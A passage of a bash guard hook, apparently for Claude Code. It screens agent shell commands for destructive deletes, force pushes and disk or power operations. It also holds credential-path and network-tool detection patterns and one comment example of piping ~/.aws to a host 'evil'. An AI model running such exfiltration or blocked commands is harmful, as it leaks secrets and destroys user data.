# a .git, and a checkout root (which contains one). `git clean` never touches
# either, so it asks sacred_owner_reason instead.
sacred_reason() {
  sacred_owner_reason "$1" && return 0
  case "$1" in
    */.git | */.git/*)
      WHY="'$1' takes a repository's .git with it — every unpushed commit, every branch, and the reflog. Delete working files instead"
      return 0
      ;;
  esac
  if [ -e "$1/.git" ]; then
    WHY="'$1' is a git checkout root — a recursive delete takes .git with it (unpushed commits, reflog). Use: git -C $1 worktree remove '$1', or name a subdirectory"
    return 0
  fi
  return 1
}

# is_agent_scratch PATH : strictly inside a root that agent tools fill with
# disposable copies and refill on demand. The signal is the declared root, not
# a record of who made the folder: the tools that create these copies are
# scripts as often as agent shell calls, so a creation log would miss them, and
# a stale log would vouch for a path that has since become something else. The
# physical path must agree, so a symlink cannot route a delete out of the root.
DATA_ROOT="${XDG_DATA_HOME:-$HOME/.local/share}"
is_agent_scratch() {
  local real
  agent_scratch_shape "$1" || return 1
  real="$(realpath -m -- "$1" 2>/dev/null)" || return 1
  agent_scratch_shape "$real"
}
agent_scratch_shape() {
  case "$1" in
    "$DATA_ROOT"/wisp/lan/?* | "$DATA_ROOT"/wisp/online/?*) return 0 ;;
  esac
  return 1
}

GREPO=""
git_root_of() { # nearest existing dir at or above PATH -> $GREPO ("" = no repo)
  local d="$1"
  [ -d "$d" ] || d="${d%/*}"
  [ -n "$d" ] || d=/
  GREPO="$(git -C "$d" rev-parse --show-toplevel 2>/dev/null || true)"
  [ -n "$GREPO" ]
}

# classify_delete_target PATH -> $CLASS (+ $WHY on every blocking tier).
CLASS="" WHY=""
classify_delete_target() {
  local p="$1" dirty
  CLASS="" WHY=""
  if is_never_path "$p"; then
    CLASS=never
    WHY="recursive delete of '$p' — never, not even by accident. Name the specific subdirectory you mean"
    return 0
  fi
  if sacred_reason "$p"; then
    CLASS=sacred
    return 0
  fi
  # A symlink loses only the link; a missing path loses nothing at all.
  if [ -L "$p" ] || [ ! -e "$p" ]; then
    CLASS=gone
    return 0
  fi
  if is_disposable "$p"; then
    CLASS=regen
    return 0
  fi
  if is_agent_scratch "$p"; then
    CLASS=scratch
    return 0
  fi
  if git_root_of "$p"; then
    # git's own answer to "is this disposable": an ignored path is build output
    # by declaration, and a clean tracked path is restorable from the object db.
    if git -C "$GREPO" check-ignore -q -- "$p" 2>/dev/null; then
      CLASS=regen
      return 0
    fi
    dirty="$(git -C "$GREPO" status --porcelain -- "$p" 2>/dev/null)"
    if [ -z "$dirty" ]; then
      CLASS=tracked
      return 0
    fi
    # Only new files, in a lane this session surely works in: its own scratch.
    if ! grep -q -v '^?? ' <<<"$dirty" && lane_of "$p" && lane_strong "$LANE"; then
      CLASS=own
      return 0
    fi
    dirty="$(head -3 <<<"$dirty")"
    CLASS=dirty
    WHY="'$p' holds work git cannot restore (${dirty//$'\n'/; }) — commit it, or gitignore it if it is build output; $OVERRIDE"
    return 0
  fi
  case "$p" in
    "$HOME"/*)
      CLASS=personal
      WHY="'$p' is personal data — no version control above it, no cache root, so nothing restores it; $OVERRIDE"
      return 0
      ;;
  esac
  CLASS=unknown
  WHY="'$p' cannot be classified as recoverable (no repository, no cache root, outside \$HOME) — blocked by default. Narrow the target to the regenerable directory you mean, or $OVERRIDE"
  return 0
}

# var_shape_check TOKEN : the `rm -rf "$VAR"/glob` family the house rules name —
# an unset variable expands to a bare-root delete. Return 0 = keep going, 1 =
# allow outright, or deny (exits). A LEADING bare $VAR is denied in every mode;
# the guarded ${VAR:?} form cannot expand to empty and is the prescribed fix.
var_shape_check() {
  strip_g "$1"
  local t="$S" pre disp
  disp="${t//\"/}" # quote residue from the split: show the shape, not the noise
  disp="${disp//\'/}"
  disp="${disp//$SUB/\$(…)}"
  case "$t" in
    *'$'* | *'`'* | *"$SUB"*) ;;
    *) return 0 ;;
  esac
  # shellcheck disable=SC2016  # matching LITERAL $HOME text in the command
  case "$t" in
    '$HOME' | '${HOME}' | '$HOME/'* | '${HOME}/'*) return 0 ;; # resolvable below
    *'${'*':?'*) return 1 ;;                                   # the prescribed guarded form
    "$SUB"*)
      deny "command substitution as a recursive-delete target ('$disp') — its output cannot be checked before it runs. Run the substitution on its own first, then rm -rf the literal path it printed"
      ;;
    '$'*)
      deny "unguarded variable as a recursive-delete target ('$disp') — an unset variable expands to a bare-root delete. Write the literal path, or guard it: rm -rf \"\${VAR:?}\"/subdir"
      ;;
  esac
  pre="${t%%[\$\`$SUB]*}"
  case "$pre" in
    /*) ;;
    *)
      ensure_cwd
      pre="${rcwd:-$cwd}/$pre"
      ;;
  esac
  case "${t#"${t%%[\$\`$SUB]*}"}" in
    */../* | */..)
      deny "'..' after a variable in a recursive-delete target ('$disp') can climb out of '$pre'. Write the literal path"
      ;;
  esac
  case "$pre" in
    */) ;;
    *) is_agent_scratch "$pre" && return 1 ;; # the expansion only lengthens a name inside a scratch root
  esac
  pre="${pre%/*}"
  [ -n "$pre" ] || pre=/
  pre="$(realpath -sm -- "$pre" 2>/dev/null)" || pre=/
  is_under_scratch "$pre" && return 1 # expansion lands in cache/temp: harmless
  deny "variable expansion inside a recursive-delete target ('$disp', under '$pre') — the guard cannot tell what it resolves to. Write the literal path, or guard it: \"\${VAR:?}\""
}

# check_delete_target TOKEN [SHAPE] : SHAPE ∈ tree|bounded. Shape never changes
# the tier — it changes how the reason reads, so a precise `find -type f -mtime
# +30 -delete` does not get told off in the words reserved for `rm -rf ~`.
check_delete_target() {
  local shape="${2:-tree}"
  strip_g "$1"
  expand_known "$S"
  local w="$EXP"
  var_shape_check "$w" || return 0
  resolve_path "$w" || { UNREAD="$w"; return 0; }
  classify_delete_target "$RES"
  case "$CLASS" in
    gone | regen | scratch | tracked | own) return 0 ;;
    never | sacred) deny "$WHY" ;;
  esac
  case "$shape" in
    bounded) deny "bounded delete (find … -delete, filtered by type/age/name): $WHY" ;;
    *) deny "whole-tree recursive delete: $WHY" ;;
  esac
}

# is_secret_path: uses $S (post strip_g); return 0 if it looks like credential
# material. Single source of the secret-path pattern — the precompute AND the ssh
# pipe-in check both call it, so the list never forks.
is_secret_path() {
  local p="${S%/}" # dir with/without trailing slash matches the same (~/.ssh ≡ ~/.ssh/)
  case "$p" in
    *.ssh/* | */.ssh | *.aws/* | */.aws | *_SECRET* | *.pem | *id_rsa* | *id_ed25519* | *id_ecdsa* | \
      *.config/sops* | */run/secrets* | *.age) return 0 ;;
  esac
  return 1
}

# ---- class 3 precompute: secret-ish path anywhere in the command?
# Token following -i/--identity (ssh/scp keyfile) is excluded — auth, not exfil.
SECRET_HIT=0
LOCALHOST_HIT=0
case "$cmd" in *localhost* | *127.0.0.1* | *'::1'*) LOCALHOST_HIT=1 ;; esac
prev=""
for t in "${TOK[@]}"; do
  if [ "$prev" = "-i" ] || [ "$prev" = "--identity" ]; then prev="$t"; continue; fi
  strip_g "$t"
  is_secret_path && SECRET_HIT=1
  prev="$S"
done
unset prev

secret_exfil_check() { # $1 = network verb (for the message)
  [ "$SECRET_HIT" = 1 ] || return 0
  [ "$LOCALHOST_HIT" = 1 ] && return 0
  deny "secret path + network verb '$1' in one command — credential exfil surface (local reads alone are fine)"
}

# ssh pipe-in exfil: deny ONLY when a secret-ish path sits in an EARLIER pipeline
# stage feeding ssh's stdin — walk TOK backward from the ssh verb, crossing pipe
# ("|") tokens but STOPPING at a hard ";" boundary (a `;`/&&/|| sequence does not
# pipe stdin). Secrets AT/AFTER the ssh verb (its own args — the -i keyfile, or a
# remote read like `ssh box 'grep X_SECRET .env'`) are never reached, so they stay
# allowed. Honors the global localhost exemption. $1 = index of the ssh verb token.
ssh_pipe_exfil_check() {
  [ "$LOCALHOST_HIT" = 1 ] && return 0
  local k
  for ((k = $1 - 1; k >= 0; k--)); do
    case "${TOK[$k]}" in ";" | "&&" | "||") break ;; esac # hard boundary — stdin does not cross it
    [ "${TOK[$k]}" = "|" ] && continue # pipe — stdin DOES flow across it
    strip_g "${TOK[$k]}"
    is_secret_path && deny "secret path piped into ssh — local credential material into ssh stdin is an exfil surface (remote reads inside ssh's own args stay allowed)"
  done
}

# redirect_skip TOKEN -> sets REDIR (1 = token is/starts a redirection, caller
# skips it) and REDIR_NEXT (1 = bare operator like `>` — skip the target too).
redirect_skip() {
  REDIR=0 REDIR_NEXT=0
  case "$1" in
    *'<'* | *'>'*)
      REDIR=1
      local op="${1//[0-9<>&-]/}"
      [ -z "$op" ] && REDIR_NEXT=1 # pure operator: > >> 2> &> <
      ;;
  esac
}

# RECURSIVE is the trigger, with or without -f: `rm -r ~/code/proj/main` loses
# exactly as much as `rm -rf` does, and the tiers below already let the cheap
# cases (gone, cache, gitignored, tracked-clean) through without friction.
handle_rm() {
  local recursive=0 endflags=0 skipnext=0 t
  local -a targets=()
  DELETE_SEEN=1
  for t in "$@"; do
    if [ "$skipnext" = 1 ]; then skipnext=0; continue; fi
    redirect_skip "$t"
    if [ "$REDIR" = 1 ]; then skipnext="$REDIR_NEXT"; continue; fi
    if [ "$endflags" = 1 ]; then targets+=("$t"); continue; fi
    case "$t" in
      --) endflags=1 ;;
      --recursive) recursive=1 ;;
      --*) ;;
      -*[rR]*) recursive=1 ;;
      -*) ;;
      *) targets+=("$t") ;;
    esac
  done
  [ "$recursive" = 1 ] || return 0
  for t in "${targets[@]}"; do check_delete_target "$t" tree; done
}

# A find whose predicates NARROW the sweep (a type plus an age/size/name filter)
# is a different act from deleting the tree, and says so in the reason. It is
# still judged by the same tiers — proportionality is in the wording, never in
# the verdict.
handle_find() {
  local has_delete=0 typef=0 narrow=0 t prev=""
  for t in "$@"; do
    case "$t" in
      -delete) has_delete=1 ;;
      -mtime | -atime | -ctime | -mmin | -amin | -cmin | -size | -name | -iname | \
        -path | -ipath | -regex | -newer* | -maxdepth) narrow=1 ;;
    esac
    [ "$prev" = "-type" ] && case "$t" in f | f,*) typef=1 ;; esac
    prev="$t"
  done
  [ "$has_delete" = 1 ] || return 0
  DELETE_SEEN=1
  local shape=tree
  { [ "$typef" = 1 ] && [ "$narrow" = 1 ]; } && shape=bounded
  local -a paths=()
  for t in "$@"; do
    case "$t" in
      -H | -L | -P | -O*) ;;
      -* | '!'* | '('* | \\* | *'<'* | *'>'*) break ;;
      *) paths+=("$t") ;;
    esac
  done
  [ "${#paths[@]}" -gt 0 ] || paths=(".") # find defaults to cwd
  for t in "${paths[@]}"; do check_delete_target "$t" "$shape"; done
}

handle_git() {
  local -a a=("$@")
  local n=$# i=0 sub="" cval="" t
  while [ "$i" -lt "$n" ]; do
    t="${a[$i]}"
    case "$t" in
      -C)
        i=$((i + 1))
        [ "$i" -lt "$n" ] && cval="${a[$i]}"
        ;;
      -c | --git-dir | --work-tree | --namespace | --exec-path) i=$((i + 1)) ;;
      --*=*) ;;
      -*) ;;
      *)
        sub="$t"
        break
        ;;
    esac
    i=$((i + 1))
  done
  local j force=0 del=0
  case "$sub" in
    worktree)
      [ "${a[$((i + 1))]:-}" = add ] || return 0
      local base save="$rcwd"
      if [ -n "$cval" ]; then
        resolve_path "$cval" || return 0
        base="$RES"
      else
        ensure_cwd
        base="${rcwd:-$cwd}"
      fi
      for ((j = i + 2; j < n; j++)); do
        case "${a[$j]}" in
          -b | -B | --reason) j=$((j + 1)) ;;
          -*) ;;
          *)
            rcwd="$base"
            resolve_path "${a[$j]}" && CREATED_LANES+=("$RES")
            rcwd="$save"
            break
            ;;
        esac
      done
      ;;
    push)
      for ((j = i + 1; j < n; j++)); do
        case "${a[$j]}" in
          --force | --force-with-lease | --force-with-lease=* | --force-if-includes | \
            --mirror | --prune) force=1 ;;
          --delete) del=1 ;;
          --*) ;;
          +*) force=1 ;; # +refspec is force-push syntax
          :*) del=1 ;;   # ':branch' refspec is delete syntax
          -*f*) force=1 ;;
        esac
      done
      [ "$force" = 1 ] && deny "git push force/mirror — history rewrites are deliberate + manual, never automated"
      # Branch deletion is not history rewrite — nothing merged is lost,
      # reflog/clones keep the commits. Allowed without safe-push — there are
      # no outgoing commits to secret-scan.
      [ "$del" = 1 ] && return 0
      [ -n "${SAFE_PUSH_ACTIVE:-}" ] && return 0 # safe-push's own inner push
      deny "raw 'git push' — house policy: use safe-push (gitleaks-scans the outgoing commits, then pushes)"
      ;;
    clean)
      for ((j = i + 1; j < n; j++)); do
        case "${a[$j]}" in --force | -*f*) force=1 ;; esac
      done
      [ "$force" = 1 ] || return 0
      DELETE_SEEN=1
      # `git clean -f` destroys untracked work by definition, so the tiers that
      # ask git what is recoverable do not apply — ownership does. The repo it
      # runs in is the one it cleans: -C when given, otherwise the cwd. That is
      # why the no-C form is no longer waved through: a `git clean -fdx` with
      # the cwd in a main/ checkout wipes the human's work-in-progress.
      if [ -n "$cval" ]; then
        resolve_path "$cval" || { UNREAD="$cval"; return 0; }
      else
        ensure_cwd
        RES="$(realpath -sm -- "${rcwd:-$cwd}" 2>/dev/null)" || return 0
      fi
      is_never_path "$RES" && deny "git clean -f in '$RES' — never"
      sacred_owner_reason "$RES" && deny "git clean -f: $WHY"
      ensure_repo_root
      if [ -n "$REPO_ROOT" ] && { [ "$RES" = "$REPO_ROOT" ] || [[ "$RES" == "$REPO_ROOT"/* ]]; }; then
        return 0
      fi
      is_disposable "$RES" && return 0
      lane_of "$RES" && lane_strong "$LANE" && return 0
      deny "git clean -f in '$RES' — outside this session's repo, and untracked files there are not in any object database; $OVERRIDE"
      ;;
  esac
}

handle_http() { # curl / wget
  secret_exfil_check "$1"
  local verb="$1" up=0 t prev=""
  shift
  for t in "$@"; do
    strip_g "$t"
    case "$prev" in
      -d | --data | --data-binary | --data-raw | --data-urlencode | --data-ascii)
        case "$S" in @*) up=1 ;; esac
        ;;
      -F | --form)
        case "$S" in @* | *=@*) up=1 ;; esac
        ;;
    esac
    case "$S" in
      -T | -T?* | --upload-file | --upload-file=*) up=1 ;;
      --post-file | --post-file=* | --body-file | --body-file=*) up=1 ;;
      -d@* | --data=@* | --data-binary=@* | --data-raw=@* | --data-urlencode=@*) up=1 ;;
      -F*=@* | --form=@*) up=1 ;;
    esac
    prev="$S"
  done
  [ "$up" = 1 ] || return 0
  [ "$LOCALHOST_HIT" = 1 ] && return 0
  deny "$verb file upload to non-localhost — outbound exfil surface"
}

# scp/rsync: SOURCE-based, mirroring the ssh narrowing (see the ssh dispatch
# note). Deny ONLY a secret-ish LOCAL SOURCE bound for a remote,
# non-localhost destination (last non-flag arg). Downloads (remote src, local
# dest) and non-secret uploads: ALLOWED. Per-verb arg-taking flags are skipped
# so `scp -i key.pem` (auth — same carve-out as class 3) and
# `-o IdentityFile=…` never read as sources; the same short flag differs by
# verb (scp -P takes a port, rsync -P is --partial --progress), hence two lists.
handle_scp_rsync() {
  local verb="$1" t skipnext=0 arg_flags
  shift
  case "$verb" in
    scp) arg_flags=' -i --identity -o -P -F -J -S ' ;;
    *) arg_flags=' -e -f -B --rsh ' ;; # rsync
  esac
  local -a nonflag=()
  for t in "$@"; do
    if [ "$skipnext" = 1 ]; then skipnext=0; continue; fi
    redirect_skip "$t"
    if [ "$REDIR" = 1 ]; then skipnext="$REDIR_NEXT"; continue; fi
    case "$t" in
      -*)
        case "$arg_flags" in *" $t "*) skipnext=1 ;; esac
        continue
        ;;
    esac
    strip_g "$t"
    nonflag+=("$S")
  done
  [ "${#nonflag[@]}" -ge 2 ] || return 0 # an upload needs a source + a dest
  local dest="${nonflag[${#nonflag[@]} - 1]}" h=""
  case "$dest" in
    rsync://*)
      h="${dest#rsync://}"
      h="${h%%/*}"
      ;;
    /* | ./* | ../*) return 0 ;; # local dest — download/move, not an upload
    *:*) h="${dest%%:*}" ;;
    *) return 0 ;; # relative local dest
  esac
  h="${h#*@}"
  case "$h" in
    '' | localhost | 127.0.0.1 | ::1) return 0 ;;
    *[!A-Za-z0-9._-]*) return 0 ;; # not a hostname → fail-open
  esac
  local k
  for ((k = 0; k < ${#nonflag[@]} - 1; k++)); do
    S="${nonflag[$k]}"
    is_secret_path && deny "$verb of secret path '$S' to remote host '$h' — credential exfil surface (non-secret uploads are allowed)"
  done
  return 0
}

handle_systemctl() {
  local user=0 sub="" t
  for t in "$@"; do
    case "$t" in
      --user) user=1 ;;
      -*) ;;
      *) [ -n "$sub" ] || sub="$t" ;;
    esac
  done
  [ "$user" = 1 ] && return 0
  case "$sub" in
    poweroff | reboot | halt | kexec | suspend | hibernate)
      deny "systemctl $sub — system power ops are manual"
      ;;
    *) return 0 ;;
  esac
}

handle_dd() {
  local t
  for t in "$@"; do
    strip_g "$t"
    case "$S" in
      of=/dev/null | of=/dev/stdout | of=/dev/stderr) ;;
      of=/dev/*) deny "dd of=${S#of=} — writing raw devices is destructive" ;;
    esac
  done
}

handle_chmod() {
  local rec=0 mode="" t
  for t in "$@"; do
    case "$t" in
      --recursive | -*R*) rec=1 ;;
      -*) ;;
      *) [ -z "$mode" ] && mode="$t" ;;
    esac
  done
  [ "$rec" = 1 ] || return 0
  case "$mode" in
    000 | 0000) deny "chmod -R $mode — recursive permission wipe" ;;
  esac
}

handle_chown() {
  local rec=0 owner="" t
  for t in "$@"; do
    case "$t" in
      --recursive | -*R*) rec=1 ;;
      -*) ;;
      *) [ -z "$owner" ] && owner="$t" ;;
    esac
  done
  [ "$rec" = 1 ] || return 0
  case "$owner" in
    root | root:*) deny "chown -R $owner — recursive root takeover of a tree" ;;
  esac
}

# ---- cwd tracking: the directories each segment may run in ------------------
# CWDS holds the candidates; "" stands for the session cwd, so the payload's
# cwd is only decoded when a relative path needs it. Only `cd X &&` narrows
# the set; every close of a subshell or block unions back what was saved at
# its open, so a miscounted open or close can only widen the set.
CWDS=("")
SCOPES=()
PENDING_POPS=0
PREV_SEP=""
SEG_START=1

join_cwds() { # join_cwds ITEMS... -> $JOINED, \x1f-separated, fork-free
  local c
  JOINED=""
  for c in "$@"; do JOINED+="$c"$'\x1f'; done
}

is_sep() { case "$1" in ";" | "|" | "&&" | "||") return 0 ;; esac; return 1; }

cwds_union() { # cwds_union JOINED : add the \x1f-joined candidates to CWDS
  local have saved
  local -a list
  IFS=$'\x1f' read -r -a list <<<"$1"
  [ "${#list[@]}" -gt 0 ] || list=("")
  for saved in "${list[@]}"; do
    for have in "${CWDS[@]}"; do [ "$have" = "$saved" ] && continue 2; done
    CWDS+=("$saved")
  done
}

# open_segment I : count the segment's scope opens (pushed now) and closes
# (popped once the segment has run).
open_segment() {
  local k="$1" tk
  PENDING_POPS=0
  while [ "$k" -lt "$n" ] && ! is_sep "${TOK[$k]}"; do
    tk="${TOK[$k]}"
    case "$tk" in
      *'\('* | *'\)') ;;
      'if' | 'while' | 'until' | 'for' | 'case' | 'select' | '{' | *'('*)
        join_cwds "${CWDS[@]}"
        SCOPES+=("$JOINED")
        ;;
    esac
    case "$tk" in
      *'\)') ;;
      'fi' | 'done' | 'esac' | '}' | *')') PENDING_POPS=$((PENDING_POPS + 1)) ;;
    esac
    k=$((k + 1))
  done
}

close_segment() {
  local top
  while [ "$PENDING_POPS" -gt 0 ]; do
    PENDING_POPS=$((PENDING_POPS - 1))
    [ "${#SCOPES[@]}" -gt 0 ] || continue
    top="${SCOPES[${#SCOPES[@]} - 1]}"
    unset 'SCOPES[${#SCOPES[@]}-1]'
    cwds_union "$top"
    forget_deeper "${#SCOPES[@]}"
  done
}

forget_deeper() { # forget_deeper DEPTH : drop variables set inside a closed block
  local name
  for name in "${!VDEPTH[@]}"; do
    [ "${VDEPTH[$name]}" -gt "$1" ] && unset "VARS[$name]" "VDEPTH[$name]"
  done
  return 0
}

forget_var() { # forget_var NAME : its value is no longer known
  [[ "$1" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]] || return 0
  unset "VARS[$1]" "VDEPTH[$1]"
}

# fresh_temp K : TOK[K] starts `; ( mktemp …)` — the substitution an assignment
# took its value from. Sets $FRESH to the not-yet-existing directory it creates.
fresh_temp() {
  local k="$1" t dir="" tmpl="" tflag=0 last=0 want=""
  [ "${TOK[$k]:-}" = ';' ] && [ "${TOK[$((k + 1))]:-}" = '(' ] || return 1
  k=$((k + 2))
  case "${TOK[$k]:-}" in *')'*) last=1 ;; esac
  strip_g "${TOK[$k]:-}"
  [ "${S##*/}" = mktemp ] || return 1
  while [ "$last" = 0 ]; do
    k=$((k + 1))
    [ "$k" -lt "$n" ] || return 1
    t="${TOK[$k]}"
    case "$t" in *')'*) last=1 ;; esac
    is_sep "$t" && return 1
    strip_g "$t"
    t="$S"
    if [ -n "$want" ]; then dir="$t" want=""; continue; fi
    case "$t" in
      -p | --tmpdir) want=dir ;;
      -p?*) dir="${t#-p}" ;;
      --tmpdir=*) dir="${t#--tmpdir=}" ;;
      -t) tflag=1 ;;
      -*) ;;
      *) tmpl="$t" ;;
    esac
  done
  [ "$want" = dir ] && dir="${TMPDIR:-/tmp}"
  # shellcheck disable=SC2088  # matching a LITERAL ~ in the command text
  case "$dir" in '~') dir="$HOME" ;; '~/'*) dir="$HOME/${dir#'~/'}" ;; esac
  if [ -n "$dir" ]; then
    FRESH="$dir/${tmpl:-tmp.XXXXXXXXXX}"
  elif [ -n "$tmpl" ] && [ "$tflag" = 0 ]; then
    FRESH="$tmpl"
  else
    FRESH="${TMPDIR:-/tmp}/${tmpl:-tmp.XXXXXXXXXX}"
  fi
  expand_known "$FRESH"
  FRESH="$EXP"
}

# assignment_segment I : a segment of only NAME=VALUE words (optionally after
# export/local/declare/readonly/typeset) sets shell variables. A value counts
# only when it surely holds for what follows: not in a pipe, not after `||`.
# Sets SEG_END.
assignment_segment() {
  local k="$1" e t sure=1
  case "${TOK[$k]}" in do | then | else | '{' | '!') k=$((k + 1)) ;; esac
  case "${TOK[$k]:-}" in export | local | declare | readonly | typeset) k=$((k + 1)) ;; esac
  e="$k"
  while [ "$e" -lt "$n" ] && ! is_sep "${TOK[$e]}"; do
    t="${TOK[$e]}"
    [[ "$t" =~ ^[A-Za-z_][A-Za-z0-9_]*= || "$t" == -* ]] || return 1
    e=$((e + 1))
  done
  [ "$e" -gt "$k" ] || return 1
  case "$PREV_SEP" in '||' | '|') sure=0 ;; esac
  [ "${TOK[$e]:-}" = '|' ] && sure=0
  for ((; k < e; k++)); do
    t="${TOK[$k]}"
    case "$t" in -*) continue ;; esac
    record_assignment "$t" "$sure" "$e"
  done
  SEG_END="$e"
}

record_assignment() { # record_assignment NAME=VALUE SURE SEP_INDEX
  local name="${1%%=*}" val="${1#*=}"
  [ "$2" = 1 ] || { forget_var "$name"; return 0; }
  case "$val" in
    "$SUB" | "\"$SUB")
      if fresh_temp "$3"; then VARS[$name]="$FRESH"; else VARS[$name]="$SUB"; fi
      VDEPTH[$name]="${#SCOPES[@]}"
      return 0
      ;;
    \'*\')
      val="${val:1:${#val}-2}"
      case "$val" in *'$'* | *"$SUB"*) forget_var "$name"; return 0 ;; esac
      ;;
    \"*\")
      [ "${#val}" -ge 2 ] || { forget_var "$name"; return 0; }
      val="${val:1:${#val}-2}"
      ;;
    \"* | \'* | *\" | *\') forget_var "$name"; return 0 ;; # the value spans words
  esac
  # shellcheck disable=SC2088  # matching a LITERAL ~ in the command text
  case "$val" in '~') val="$HOME" ;; '~/'*) val="$HOME/${val#'~/'}" ;; esac
  expand_known "$val"
  VARS[$name]="$EXP"
  VDEPTH[$name]="${#SCOPES[@]}"
}

# handle_cd NEXT_SEP ARGS... : move the candidates. An unknowable target
# (variable, glob, `cd -`) leaves them where they were.
handle_cd() {
  local next="$1" t dest="" here
  shift
  local -a moved=()
  [ "$PREV_SEP" = "|" ] && return 0
  [ "$next" = "|" ] && return 0
  for t in "$@"; do
    case "$t" in
      --) continue ;;
      -) return 0 ;;
      -*) continue ;;
    esac
    dest="$t"
    break
  done
  [ -n "$dest" ] || dest='~'
  case "$dest" in *[*?]* | +*) return 0 ;; esac
  for here in "${CWDS[@]}"; do
    rcwd="$here"
    resolve_path "$dest" || { rcwd=""; return 0; }
    moved+=("$RES")
    CD_DIRS+=("$RES")
  done
  rcwd=""
  if [ "$next" = "&&" ]; then
    CWDS=("${moved[@]}")
  else
    join_cwds "${moved[@]}"
    cwds_union "$JOINED"
  fi
}

# in_each_cwd HANDLER ARGS... : run a path-judging handler once per candidate.
in_each_cwd() {
  local here
  for here in "${CWDS[@]}"; do
    rcwd="$here"
    "$@"
  done
  rcwd=""
}

# ---- segment walk: find each segment's command word, dispatch with its args.
rcwd=""
i=0
n="${#TOK[@]}"
while [ "$i" -lt "$n" ]; do
  t="${TOK[$i]}"
  if is_sep "$t"; then
    close_segment
    PREV_SEP="$t"
    SEG_START=1
    i=$((i + 1))
    continue
  fi
  if [ "$SEG_START" = 1 ]; then
    SEG_START=0
    open_segment "$i"
    if assignment_segment "$i"; then
      i="$SEG_END"
      continue
    fi
  fi
  case "$t" in for | select) forget_var "${TOK[$((i + 1))]:-}" ;; esac
  # prefix skippers at segment start
  word="${t#'('}"
  word="${word#'{'}"
  strip_g "$word"
  word="$S"
  word="${word##*/}"
  case "$word" in
    sudo | doas | command | builtin | nohup | nice | ionice | stdbuf | eval | exec | time | timeout | env)
      i=$((i + 1))
      continue
      ;;
    '' | '{' | '}' | '(' | ')' | if | then | elif | else | fi | do | done | while | until | for | '!')
      i=$((i + 1))
      continue
      ;;
    -u) # sudo -u USER — consume the user arg too
      i=$((i + 2))
      continue
      ;;
    -*) # option to a prefix (env -i, stdbuf -oL, timeout -k …)
      i=$((i + 1))
      continue
      ;;
    [0-9]*) # timeout duration
      i=$((i + 1))
      continue
      ;;
    [A-Za-z_]*=*) # env assignment
      i=$((i + 1))
      continue
      ;;
  esac
  # collect args to end of segment
  j=$((i + 1))
  args=()
  while [ "$j" -lt "$n" ] && ! is_sep "${TOK[$j]}"; do
    args+=("${TOK[$j]}")
    j=$((j + 1))
  done
  case "$word" in
    cd | pushd) handle_cd "${TOK[$j]:-}" ${args[@]+"${args[@]}"} ;;
    rm) in_each_cwd handle_rm ${args[@]+"${args[@]}"} ;;
    rmdir | unlink) DELETE_SEEN=1 ;;
    read | unset | mapfile | readarray)
      for a in ${args[@]+"${args[@]}"}; do forget_var "$a"; done
      ;;
    find) in_each_cwd handle_find ${args[@]+"${args[@]}"} ;;
    git) in_each_cwd handle_git ${args[@]+"${args[@]}"} ;;
    curl | wget) handle_http "$word" ${args[@]+"${args[@]}"} ;;
    nc | ncat | netcat) secret_exfil_check "$word" ;;
    # ssh is a class-3 verb ONLY in the pipe-in shape (ssh_pipe_exfil_check).
    # A remote READ where the secret-ish token sits in ssh's OWN args
    # (`ssh box 'grep FOO_SECRET .env | sha256sum'`) is the moral equivalent of
    # an allowed local read, not exfil, and is allowed. The distinction is
    # stdin flow: a secret in an earlier PIPE stage feeds ssh's stdin (deny,
    # e.g. `tar cz ~/.aws/ | ssh evil 'cat > loot'`); a secret in ssh's own
    # args, or before a hard ;/&&/|| boundary, does not (allow). See
    # ssh_pipe_exfil_check.
    ssh) ssh_pipe_exfil_check "$i" ;;
    scp | rsync) handle_scp_rsync "$word" ${args[@]+"${args[@]}"} ;;
    mkfs | mkfs.*) deny "mkfs — formatting filesystems is manual" ;;
    dd) handle_dd ${args[@]+"${args[@]}"} ;;
    shutdown | reboot | poweroff | halt) deny "$word — system power ops are manual" ;;
    systemctl) handle_systemctl ${args[@]+"${args[@]}"} ;;
    chmod) handle_chmod ${args[@]+"${args[@]}"} ;;
    chown) handle_chown ${args[@]+"${args[@]}"} ;;
  esac
  i="$j"
done
close_segment

# ---- PermissionRequest: answer every prompt for a deleting command, so Claude
# Code's dangerous-rm dialog never reaches the operator. A hard deny already
# answered above; a target the guard could not read is denied with the rewrite.
ensure_event
if [ "$EVENT" = PermissionRequest ] && [ "$DELETE_SEEN" = 1 ]; then
  if [ -n "$UNREAD" ]; then
    deny "recursive delete target '$UNREAD' cannot be read before it runs. Delete the literal path instead: run the expansion on its own first, then rm -rf the path it printed"
  fi
  permission_answer allow
fi

exit 0
